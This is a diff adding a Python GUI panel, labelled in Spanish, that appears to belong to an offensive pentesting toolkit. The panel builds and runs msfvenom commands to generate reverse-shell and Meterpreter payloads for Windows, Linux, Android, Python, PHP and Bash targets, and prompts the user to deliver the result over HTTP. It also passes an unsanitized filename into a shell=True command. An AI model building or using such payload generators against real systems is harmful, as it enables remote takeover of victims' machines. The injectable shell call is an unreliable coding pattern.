@@ -1,0 +1,120 @@
+import os
+import platform
+import subprocess
+import threading
+
+import customtkinter as ctk
+
+from ..ui_constants import UI_FONT, UI_FONT_BOLD, MONO_FONT
+from ..services import build_msfvenom_cmd
+
+
+class PayloadsPanel(ctk.CTkFrame):
+    PAYLOADS_DB = {
+        "Windows (.exe)":   {"p": "windows/meterpreter/reverse_tcp", "f": "exe", "ext": "exe"},
+        "Linux (.elf)":     {"p": "linux/x64/shell_reverse_tcp",     "f": "elf", "ext": "elf"},
+        "Android (.apk)":   {"p": "android/meterpreter/reverse_tcp", "f": "raw", "ext": "apk"},
+        "Python (.py)":     {"p": "python/meterpreter/reverse_tcp",  "f": "raw", "ext": "py"},
+        "Web PHP (.php)":   {"p": "php/meterpreter_reverse_tcp",     "f": "raw", "ext": "php"},
+        "Bash (.sh)":       {"p": "cmd/unix/reverse_bash",           "f": "raw", "ext": "sh"}
+    }
+
+    def __init__(self, app):
+        super().__init__(app.content, fg_color=app.c["BG_MAIN"])
+        self.app = app
+        self.build()
+
+    def build(self):
+        c = self.app.c
+        header = ctk.CTkFrame(self, fg_color=c["BG_CARD"])
+        header.pack(fill="x", pady=8)
+        ctk.CTkLabel(header, text="Generador de Payloads (msfvenom)", font=("Poppins", 18, "bold"), text_color=c["TEXT_PRIMARY"]).pack(side="left", padx=16, pady=14)
+
+        form = ctk.CTkFrame(self, fg_color=c["BG_PANEL"])
+        form.pack(fill="x", padx=14, pady=10)
+
+        ctk.CTkLabel(form, text="Sistema Objetivo:", font=UI_FONT, text_color=c["TEXT_PRIMARY"]).grid(row=0, column=0, padx=12, pady=10, sticky="e")
+        self.payload_os_menu = ctk.CTkOptionMenu(form, values=list(self.PAYLOADS_DB.keys()),
+                                                 fg_color=c["BG_CARD"], button_color=c["ACCENT"], button_hover_color=c["ACCENT_HOVER"],
+                                                 dropdown_fg_color=c["BG_CARD"], dropdown_text_color=c["TEXT_PRIMARY"],
+                                                 text_color=c["TEXT_PRIMARY"], font=UI_FONT)
+        self.payload_os_menu.grid(row=0, column=1, padx=12, pady=10, sticky="w")
+
+        ctk.CTkLabel(form, text="LHOST (Tu IP):", font=UI_FONT, text_color=c["TEXT_PRIMARY"]).grid(row=1, column=0, padx=12, pady=10, sticky="e")
+        self.payload_lhost = ctk.CTkEntry(form, width=190,
+                                          fg_color=c["BG_CARD"], border_color=c["ACCENT_SECONDARY"], border_width=1,
+                                          corner_radius=10, text_color=c["TEXT_PRIMARY"], font=UI_FONT)
+        self.payload_lhost.insert(0, self.app.obtener_ip_local())
+        self.payload_lhost.grid(row=1, column=1, padx=12, pady=10, sticky="w")
+
+        ctk.CTkLabel(form, text="LPORT:", font=UI_FONT, text_color=c["TEXT_PRIMARY"]).grid(row=2, column=0, padx=12, pady=10, sticky="e")
+        self.payload_lport = ctk.CTkEntry(form, width=190,
+                                          fg_color=c["BG_CARD"], border_color=c["ACCENT_SECONDARY"], border_width=1,
+                                          corner_radius=10, text_color=c["TEXT_PRIMARY"], font=UI_FONT)
+        self.payload_lport.insert(0, "4444")
+        self.payload_lport.grid(row=2, column=1, padx=12, pady=10, sticky="w")
+
+        ctk.CTkLabel(form, text="Nombre de salida:", font=UI_FONT, text_color=c["TEXT_PRIMARY"]).grid(row=3, column=0, padx=12, pady=10, sticky="e")
+        self.payload_filename = ctk.CTkEntry(form, width=190,
+                                             fg_color=c["BG_CARD"], border_color=c["ACCENT_SECONDARY"], border_width=1,
+                                             corner_radius=10, text_color=c["TEXT_PRIMARY"], font=UI_FONT)
+        self.payload_filename.insert(0, "shell")
+        self.payload_filename.grid(row=3, column=1, padx=12, pady=10, sticky="w")
+
+        self.btn_gen_payload = ctk.CTkButton(self, text="Generar Payload", fg_color=c["ACCENT"], hover_color=c["ACCENT_HOVER"],
+                                             corner_radius=12, font=UI_FONT_BOLD, command=self.generar_payload, height=44)
+        self.btn_gen_payload.pack(fill="x", padx=14, pady=14)
+
+        self.payload_output = ctk.CTkTextbox(self, height=260, font=MONO_FONT,
+                                             fg_color=c["BG_CARD"], text_color=c["TEXT_PRIMARY"])
+        self.payload_output.pack(fill="both", expand=True, padx=14, pady=(0, 14))
+
+    def generar_payload(self):
+        seleccion = self.payload_os_menu.get()
+        lhost = self.payload_lhost.get()
+        lport = self.payload_lport.get()
+        nombre_base = self.payload_filename.get()
+        if not lhost or not lport or not nombre_base:
+            self.payload_output.delete("1.0", "end")
+            self.payload_output.insert("end", "[!] Falta IP, Puerto o Nombre.")
+            if self.app.logger:
+                self.app.logger.warn("Falta IP, puerto o nombre", tag="PAYLOADS")
+            return
+        datos = self.PAYLOADS_DB[seleccion]
+        payload_code = datos["p"]
+        file_format = datos["f"]
+        extension = datos["ext"]
+        full_filename = f"{nombre_base}.{extension}"
+        cmd = build_msfvenom_cmd(payload_code, lhost, lport, file_format, full_filename)
+        self.payload_output.delete("1.0", "end")
+        sistema = platform.system()
+        if self.app.logger:
+            self.app.logger.payloads(f"Generando payload {full_filename} ({seleccion})")
+        if sistema == "Windows":
+            self.payload_output.insert("end", "[*] Estás en Windows. Copia y pega en tu Kali:\n\n")
+            self.payload_output.insert("end", cmd)
+        else:
+            self.payload_output.insert("end", f"[*] Generando {full_filename}...\n[*] Ejecutando: {cmd}\n\n")
+
+            def run_msf():
+                try:
+                    process = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+                    if process.returncode == 0:
+                        self.after(0, lambda: self.log_payload_success(full_filename))
+                    else:
+                        self.after(0, lambda: self.log_payload_error(process.stderr))
+                except Exception as e:
+                    self.after(0, lambda: self.log_payload_error(str(e)))
+
+            threading.Thread(target=run_msf, daemon=True).start()
+
+    def log_payload_success(self, filename):
+        self.payload_output.insert("end", f"[+] Éxito: {filename} creado en {os.getcwd()}\n")
+        self.payload_output.insert("end", "[*] Usa el servidor HTTP para entregarlo.\n")
+        if self.app.logger:
+            self.app.logger.payloads(f"Payload creado: {filename}")
+
+    def log_payload_error(self, err):
+        self.payload_output.insert("end", f"[!] Error: {err}\n¿msfvenom está en el PATH?")
+        if self.app.logger:
+            self.app.logger.error(f"Error generando payload: {err}", tag="PAYLOADS")
